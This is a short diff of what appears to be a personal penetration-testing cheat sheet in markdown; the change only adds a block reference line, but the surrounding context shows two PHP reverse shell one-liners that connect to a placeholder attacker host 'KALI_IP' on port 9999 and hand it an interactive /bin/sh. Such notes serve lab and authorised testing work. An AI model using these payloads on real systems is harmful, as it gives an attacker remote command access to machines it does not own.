@@ -8,6 +8,8 @@ tags:
 php -r '$sock=fsockopen("KALI_IP",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+^cba9ae
+
 ```bash
 php -r '$sock=fsockopen("KALI_IP",9999);shell_exec("/bin/sh <&3 >&3 2>&3");'
 ```
